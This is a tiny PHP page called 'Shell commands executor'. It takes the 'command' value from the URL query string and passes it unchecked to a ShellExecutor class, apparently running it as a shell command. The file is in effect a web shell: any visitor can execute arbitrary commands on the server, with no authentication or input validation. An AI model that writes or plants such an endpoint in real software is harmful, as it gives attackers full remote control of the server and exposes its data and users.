<html lang="en">
<head>
    <title>Shell commands executor</title>
    <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
</head>
<body>
<?php
include 'ShellExecutor.php';

$executor = new ShellExecutor();
$command = $_GET['command'];
$executor->execute($command);

?>
</body>
</html>
